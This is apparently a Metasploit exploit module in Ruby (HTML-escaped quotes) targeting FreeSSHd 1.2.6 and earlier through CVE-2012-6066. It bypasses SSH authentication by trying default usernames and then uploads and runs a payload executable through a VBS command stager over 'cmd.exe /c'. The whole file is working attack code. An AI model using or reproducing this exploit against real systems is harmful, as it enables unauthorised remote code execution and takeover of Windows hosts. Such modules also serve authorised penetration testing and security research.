require &#039;tempfile&#039;
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Freesshd Authentication Bypass",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass
        authentication. You just need the username (which defaults to root). The exploit
        has been tested with both password and public key authentication.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Aris&#039;, # Vulnerability discovery and Exploit
          &#039;kcope&#039;, # 2012 Exploit
          &#039;Daniele Martini <cyrax[at]pkcrew.org>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-6066&#039; ],
          [ &#039;OSVDB&#039;, &#039;88006&#039; ],
          [ &#039;BID&#039;, &#039;56785&#039; ],
          [ &#039;URL&#039;, &#039;http://archives.neohapsis.com/archives/fulldisclosure/2012-12/0012.html&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2010/Aug/132&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Aug 11 2010",
      &#039;Targets&#039; =>
        [
          [ &#039;Freesshd <= 1.2.6 / Windows (Universal)&#039;, {} ]
        ],
      &#039;DefaultTarget&#039; => 0
    ))

    register_options(
      [
        OptInt.new(&#039;RPORT&#039;, [false, &#039;The target port&#039;, 22]),
        OptString.new(&#039;USERNAMES&#039;,[true,&#039;Space Separate list of usernames to try for ssh authentication&#039;,&#039;root admin Administrator&#039;])
      ], self.class)
  end

  def load_netssh
    begin
      require &#039;net/ssh&#039;
      return true
    rescue LoadError
      return false
    end
  end

  def check
    connect
    banner = sock.recv(30)
    disconnect
    if banner =~ /SSH-2.0-WeOnlyDo/
      version=banner.split(" ")[1]
      return Exploit::CheckCode::Vulnerable if version =~ /(2.1.3|2.0.6)/
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end


  def upload_payload(connection)
    exe = generate_payload_exe
    filename = rand_text_alpha(8) + ".exe"
    cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
    opts = {
      :linemax => 1700,
      :decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
    }

    cmds = cmdstager.generate(opts)

    if (cmds.nil? or cmds.length < 1)
      print_error("The command stager could not be generated")
      raise ArgumentError
    end
    cmds.each { |cmd|
      ret = connection.exec!("cmd.exe /c "+cmd)
    }

  end

  def setup_ssh_options
    pass=rand_text_alpha(8)
    options={
      :password => pass,
      :port     => datastore[&#039;RPORT&#039;],
      :timeout  => 1,
      :proxies  => datastore[&#039;Proxies&#039;],
      :key_data => OpenSSL::PKey::RSA.new(2048).to_pem
    }
    return options
  end

  def do_login(username,options)
    print_status("Trying username "+username)
    options[:username]=username

    transport = Net::SSH::Transport::Session.new(datastore[&#039;RHOST&#039;], options)
    auth = Net::SSH::Authentication::Session.new(transport, options)
    auth.authenticate("ssh-connection", username, options[:password])
    connection = Net::SSH::Connection::Session.new(transport, options)
    begin
      Timeout.timeout(10) do
        connection.exec!(&#039;cmd.exe /c echo&#039;)
      end
    rescue  RuntimeError
      return nil
    rescue  Timeout::Error
      print_status("Timeout")
      return nil
    end
    return connection
  end

  def exploit
    #
    # Load net/ssh so we can talk the SSH protocol
    #
    has_netssh = load_netssh
    if not has_netssh
      print_error("You don&#039;t have net/ssh installed.  Please run gem install net-ssh")
      return
    end

    options=setup_ssh_options

    connection = nil

    usernames=datastore[&#039;USERNAMES&#039;].split(&#039; &#039;)
    usernames.each { |username|
      connection=do_login(username,options)
      break if connection
    }

    if connection
      print_status("Uploading payload. (This step can take up to 5 minutes. But if you are here, it will probably work. Have faith.)")
      upload_payload(connection)
      handler
    end
  end
end

